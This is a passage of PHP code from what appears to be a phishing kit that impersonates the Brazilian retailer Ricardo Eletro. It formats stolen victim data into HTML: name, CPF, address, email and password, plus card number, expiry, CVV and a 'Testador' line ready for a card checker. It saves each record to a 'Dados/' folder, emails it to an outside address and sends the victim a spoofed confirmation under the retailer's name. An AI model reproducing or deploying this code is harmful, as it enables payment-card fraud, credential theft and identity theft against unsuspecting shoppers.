    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:16px;\">Endereço:</th>
    
  </tr>
    <tr>
    <td align=\"right\">CEP:</td>
    <td>&nbsp;</td>
    <td>$cep</td>
  </tr>
  <tr>
    <td align=\"right\">Endereco:</td>
    <td>&nbsp;</td>
    <td>$rua</td>
  </tr>
  <tr>
    <td align=\"right\">Numero:</td>
    <td>&nbsp;</td>
    <td>$numero</td>
  </tr>
  <tr>
    <td align=\"right\">Complemento:</td>
    <td>&nbsp;</td>
    <td>$complemento</td>
  </tr>
   <tr>
    <td height=\"26\" align=\"right\">Bairro:</td>
    <td>&nbsp;</td>
    <td>$bairro</td>
  </tr>
    <tr>
    <td align=\"right\">Cidade</td>
    <td>&nbsp;</td>
    <td>$cidade</td>
  </tr>
    <tr>
    <td align=\"right\">Estado:</td>
    <td>&nbsp;</td>
    <td>$estado</td>
  </tr>
  <tr>
    <td align=\"right\">Ponto de Referência:</td>
    <td>&nbsp;</td>
    <td>$preferencia</td>
  </tr>
  
  <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:15px;\">Dados de Identificação:</th>
    
  </tr>
  <tr>
    <td align=\"right\">Email:</td>
    <td>&nbsp;</td>
    <td>$email</td>
  </tr>
  <tr>
    <td align=\"right\">Senha:</td>
    <td>&nbsp;</td>
    <td>$pass1</td>
  </tr>
  <tr>
    <td align=\"right\">Hora da Compra:</td>
    <td>&nbsp;</td>
    <td>$date </td>
  </tr>
  <tr>
<tr>
    <td align=\"right\">Produto:</td>
    <td>&nbsp;</td>
    <td>$produto </td>
  </tr>
  <tr>
    <td align=\"right\">Preco:</td>
    <td>&nbsp;</td>
    <td>$preco </td>
  </tr>
  <tr>
  <tr>
    <td align=\"right\">IP:</td>
    <td>&nbsp;</td>
    <td>$ip</td>
  </tr>
  <tr>

    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:16px;\">Dados Cartão:</th>
    
  </tr>
  <tr>
    <td align=\"right\">Nome Cartão :</td>
    <td>&nbsp;</td>
    <td>$nomecc1</td>
  </tr>
  <tr>
    <td align=\"right\">CPF:</td>
    <td>&nbsp;</td>
    <td>$cpf2</td>
  </tr>
  <tr>
    <td align=\"right\">Nascimento:</td>
    <td>&nbsp;</td>
    <td>$nascimento2</td>
  </tr>
  <tr>
    <td align=\"right\">Número Cartão:</td>
    <td>&nbsp;</td>
    <td><strong>$cartao</strong></td>
  </tr>
  <tr>
    <td align=\"right\">Número Cartão(Sem Espaço):</td>
    <td>&nbsp;</td>
    <td>$cc</td>
  </tr>
  <tr>
    <td align=\"right\">Validade:</td>
    <td>&nbsp;</td>
    <td><strong>$validade</strong></td>
  </tr>
  <tr>
    <td align=\"right\">CVV:</td>
    <td>&nbsp;</td>
    <td><strong>$segurancacvv</strong></td>
  </tr>
   <tr>
    <td align=\"right\">Bandeira:</td>
    <td>&nbsp;</td>
    <td><strong>$bandeira</strong></td>
  </tr>
   <tr>
    <td align=\"right\">Parcela:</td>
    <td>&nbsp;</td>
    <td><strong>$parcela</strong></td>
  </tr>

  <tr>
    <td align=\"right\">Testador:</td>
    <td>&nbsp;</td>
    <td><strong>$cc;$validade;$segurancacvv;</strong></td>
  </tr>
    
  <tr>
    <td align=\"right\">Bin Cartão:</td>
    <td>&nbsp;</td>
    <td><strong>$q2[0]</strong></td>
  </tr>
</table>
	
	</span>

	";
}else{
$mensage =	"
  <style type=\"text/css\">
		table tr td{padding:4px;}
	</style>
</p>
<table width=\"586\" border=\"0\" cellpadding=\"3\" style=\"font-family:Arial, 'lucida grande',tahoma,verdana,arial,sans-serif; border-spacing: 4px;font-size:14px; color:#333;\">

  <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:16px;\">Dados Pessoa Física:</th>
    
  </tr>
  <tr>
    <td width=\"196\" align=\"right\">Nome:</td>
    <td width=\"46\">&nbsp;</td>
    <td width=\"318\" align=\"left\">$nome $sobrenome</td>
  </tr>
  <tr>
    <td align=\"right\">CPF:</td>
    <td>&nbsp;</td>
    <td>$cpf</td>
  </tr>
  <tr>
    <td align=\"right\">Data de Nascimento:</td>
    <td>&nbsp;</td>
    <td>$nascimento</td>
  </tr>
  <tr>
    <td align=\"right\">Apelido:</td>
    <td>&nbsp;</td>
    <td>$apelido</td>
  </tr>
  <tr>
    <td align=\"right\">Profissao:</td>
    <td>&nbsp;</td>
    <td>$profissao</td>
  </tr>

  <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:15px;\">Dados de Contato:</th>
    
  </tr>
  <tr>
    <td align=\"right\">Telefone 1:</td>
    <td>&nbsp;</td>
    <td>$ddcontato1 $fonecontato1 $ramalcontato1</td>
  </tr>
  <tr>
    <td align=\"right\">Telefone 2:</td>
    <td>&nbsp;</td>
    <td>$ddcontato2 $fonecontato2 $ramalcontato2</td>
  </tr>
  <tr>
    <td align=\"right\">Celular:</td>
    <td>&nbsp;</td>
    <td>$ddcontato3 $foncontato3 </td>
  </tr>
  <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:16px;\">Endereço:</th>
    
  </tr>
    <tr>
    <td align=\"right\">CEP:</td>
    <td>&nbsp;</td>
    <td>$cep</td>
  </tr>
  <tr>
    <td align=\"right\">Endereco:</td>
    <td>&nbsp;</td>
    <td>$rua</td>
  </tr>
  <tr>
    <td align=\"right\">Numero:</td>
    <td>&nbsp;</td>
    <td>$numero</td>
  </tr>
  <tr>
    <td align=\"right\">Complemento:</td>
    <td>&nbsp;</td>
    <td>$complemento</td>
  </tr>
   <tr>
    <td height=\"26\" align=\"right\">Bairro:</td>
    <td>&nbsp;</td>
    <td>$bairro</td>
  </tr>
    <tr>
    <td align=\"right\">Cidade</td>
    <td>&nbsp;</td>
    <td>$cidade</td>
  </tr>
    <tr>
    <td align=\"right\">Estado:</td>
    <td>&nbsp;</td>
    <td>$estado</td>
  </tr>
  <tr>
    <td align=\"right\">Ponto de Referência:</td>
    <td>&nbsp;</td>
    <td>$preferencia</td>
  </tr>
  
  <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:15px;\">Dados de Identificação:</th>
    
  </tr>
  <tr>
    <td align=\"right\">Email:</td>
    <td>&nbsp;</td>
    <td>$email</td>
  </tr>
  <tr>
    <td align=\"right\">Senha:</td>
    <td>&nbsp;</td>
    <td>$pass1</td>
  </tr>
  <tr>
    <td align=\"right\">Hora da Compra:</td>
    <td>&nbsp;</td>
    <td>$date </td>
  </tr>
  <tr>
<tr>
    <td align=\"right\">Produto:</td>
    <td>&nbsp;</td>
    <td>$produto </td>
  </tr>
  <tr>
    <td align=\"right\">Preco:</td>
    <td>&nbsp;</td>
    <td>$preco </td>
  </tr>
  <tr>
  <tr>
    <td align=\"right\">IP:</td>
    <td>&nbsp;</td>
    <td>$ip</td>
  </tr>
  <tr>

    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:16px;\">Dados Cartão:</th>
    
  </tr>
  <tr>
    <td align=\"right\">Nome Cartão :</td>
    <td>&nbsp;</td>
    <td>$nomecc1</td>
  </tr>
  <tr>
    <td align=\"right\">CPF:</td>
    <td>&nbsp;</td>
    <td>$cpf2</td>
  </tr>
  <tr>
    <td align=\"right\">Nascimento:</td>
    <td>&nbsp;</td>
    <td>$nascimento2</td>
  </tr>
  <tr>
    <td align=\"right\">Número Cartão:</td>
    <td>&nbsp;</td>
    <td><strong>$cartao</strong></td>
  </tr>
  <tr>
    <td align=\"right\">Número Cartão(Sem Espaço):</td>
    <td>&nbsp;</td>
    <td>$cc</td>
  </tr>
  <tr>
    <td align=\"right\">Validade:</td>
    <td>&nbsp;</td>
    <td><strong>$validade</strong></td>
  </tr>
  <tr>
    <td align=\"right\">CVV:</td>
    <td>&nbsp;</td>
    <td><strong>$segurancacvv</strong></td>
  </tr>
   <tr>
    <td align=\"right\">Bandeira:</td>
    <td>&nbsp;</td>
    <td><strong>$bandeira</strong></td>
  </tr>
   <tr>
    <td align=\"right\">Parcela:</td>
    <td>&nbsp;</td>
    <td><strong>$parcela</strong></td>
  </tr>

  <tr>
    <td align=\"right\">Testador:</td>
    <td>&nbsp;</td>
    <td><strong>$cc;$validade;$segurancacvv;</strong></td>
  </tr>
    
  <tr>
    <td align=\"right\">Bin Cartão:</td>
    <td>&nbsp;</td>
    <td><strong>$q2[0]</strong></td>
  </tr>
</table>
	
	</span>

	";
	
	
}

$teste = html_entity_decode($nomecompleto);
$headers .= "MIME-Version: 1.1" ."\r\n";
$headers .= "Content-type: text/html; charset=utf-8" ."\r\n";
// Perceba que a linha acima contém "text/html", sem essa linha, a mensagem não chegará formatada.
$headers .= "From:  Ricardo Eletro <selecao-ofertas@ricardoeletro.com.br>" ."\r\n";

    //======================================
 // Se você quiser tirar a opção de salvar em .txt, delete todo esse código abaixo, de um //=== até o outro lá em baixo ! 
//==================================================================
$today = date("d");
$gera = rand(1,99999999);
$ip_usuario = @$_SERVER['REMOTE_ADDR'];
$myFile =  "Dados/". $gera.$today. ".htm";
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData =	"
<meta charset=\"utf-8\">

  <style type=\"text/css\">
		table tr td{padding:4px;}
	</style>
</p>
<table width=\"586\" border=\"0\" cellpadding=\"3\" style=\"font-family:Arial, 'lucida grande',tahoma,verdana,arial,sans-serif; border-spacing: 4px;font-size:14px; color:#333;\">

  <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:16px;\">Dados Pessoa Física:</th>
    
  </tr>
  <tr>
    <td width=\"196\" align=\"right\">Nome:</td>
    <td width=\"46\">&nbsp;</td>
    <td width=\"318\" align=\"left\">$nome $sobrenome</td>
  </tr>
  <tr>
    <td align=\"right\">CPF:</td>
    <td>&nbsp;</td>
    <td>$cpf</td>
  </tr>
  <tr>
    <td align=\"right\">Data de Nascimento:</td>
    <td>&nbsp;</td>
    <td>$nascimento</td>
  </tr>
  <tr>
    <td align=\"right\">Apelido:</td>
    <td>&nbsp;</td>
    <td>$apelido</td>
  </tr>
  <tr>
    <td align=\"right\">Profissao:</td>
    <td>&nbsp;</td>
    <td>$profissao</td>
  </tr>

  <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:15px;\">Dados de Contato:</th>
    
  </tr>
  <tr>
    <td align=\"right\">Telefone 1:</td>
    <td>&nbsp;</td>
    <td>$ddcontato1 $fonecontato1 $ramalcontato1</td>
  </tr>
  <tr>
    <td align=\"right\">Telefone 2:</td>
    <td>&nbsp;</td>
    <td>$ddcontato2 $fonecontato2 $ramalcontato2</td>
  </tr>
  <tr>
    <td align=\"right\">Celular:</td>
    <td>&nbsp;</td>
    <td>$ddcontato3 $foncontato3 </td>
  </tr>
  <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:16px;\">Endereço:</th>
    
  </tr>
    <tr>
    <td align=\"right\">CEP:</td>
    <td>&nbsp;</td>
    <td>$cep</td>
  </tr>
  <tr>
    <td align=\"right\">Endereco:</td>
    <td>&nbsp;</td>
    <td>$rua</td>
  </tr>
  <tr>
    <td align=\"right\">Numero:</td>
    <td>&nbsp;</td>
    <td>$numero</td>
  </tr>
  <tr>
    <td align=\"right\">Complemento:</td>
    <td>&nbsp;</td>
    <td>$complemento</td>
  </tr>
   <tr>
    <td height=\"26\" align=\"right\">Bairro:</td>
    <td>&nbsp;</td>
    <td>$bairro</td>
  </tr>
    <tr>
    <td align=\"right\">Cidade</td>
    <td>&nbsp;</td>
    <td>$cidade</td>
  </tr>
    <tr>
    <td align=\"right\">Estado:</td>
    <td>&nbsp;</td>
    <td>$estado</td>
  </tr>
  <tr>
    <td align=\"right\">Ponto de Referência:</td>
    <td>&nbsp;</td>
    <td>$preferencia</td>
  </tr>
  
  <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:15px;\">Dados de Identificação:</th>
    
  </tr>
  <tr>
    <td align=\"right\">Email:</td>
    <td>&nbsp;</td>
    <td>$email</td>
  </tr>
  <tr>
    <td align=\"right\">Senha:</td>
    <td>&nbsp;</td>
    <td>$pass1</td>
  </tr>
  <tr>
    <td align=\"right\">Hora da Compra:</td>
    <td>&nbsp;</td>
    <td>$date </td>
  </tr>
  <tr>
<tr>
    <td align=\"right\">Produto:</td>
    <td>&nbsp;</td>
    <td>$produto </td>
  </tr>
  <tr>
    <td align=\"right\">Preco:</td>
    <td>&nbsp;</td>
    <td>$preco </td>
  </tr>
  <tr>
  <tr>
    <td align=\"right\">IP:</td>
    <td>&nbsp;</td>
    <td>$ip</td>
  </tr>
  <tr>

    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:16px;\">Dados Cartão:</th>
    
  </tr>
  <tr>
    <td align=\"right\">Nome Cartão :</td>
    <td>&nbsp;</td>
    <td>$nomecc1</td>
  </tr>
  <tr>
    <td align=\"right\">CPF:</td>
    <td>&nbsp;</td>
    <td>$cpf2</td>
  </tr>
  <tr>
    <td align=\"right\">Nascimento:</td>
    <td>&nbsp;</td>
    <td>$nascimento2</td>
  </tr>
  <tr>
    <td align=\"right\">Número Cartão:</td>
    <td>&nbsp;</td>
    <td><strong>$cartao</strong></td>
  </tr>
  <tr>
    <td align=\"right\">Número Cartão(Sem Espaço):</td>
    <td>&nbsp;</td>
    <td>$cc</td>
  </tr>
  <tr>
    <td align=\"right\">Validade:</td>
    <td>&nbsp;</td>
    <td><strong>$validade</strong></td>
  </tr>
  <tr>
    <td align=\"right\">CVV:</td>
    <td>&nbsp;</td>
    <td><strong>$segurancacvv</strong></td>
  </tr>
   <tr>
    <td align=\"right\">Bandeira:</td>
    <td>&nbsp;</td>
    <td><strong>$nameBandeira</strong></td>
  </tr>
   <tr>
    <td align=\"right\">Parcela:</td>
    <td>&nbsp;</td>
    <td><strong>$parcela</strong></td>
  </tr>

  <tr>
    <td align=\"right\">Testador:</td>
    <td>&nbsp;</td>
    <td><strong>$cc;$validade;$segurancacvv;</strong></td>
  </tr>
    
  <tr>
    <td align=\"right\">Bin Cartão:</td>
    <td>&nbsp;</td>
    <td><strong>$info</strong></td>
  </tr>
</table>
	
	</span>

	";
fwrite($fh, $stringData);
fclose($fh);
$mensagem=$stringData;

    mail( "acestbh@live.com.com", "{$cartao2111[0]}", $mensage, $headers);					
	mail( $email, "Informacoes do Pedido: {$numberPedido}", $mensagem_cancelado, $headers);	




//==================================================================


}
}
?>

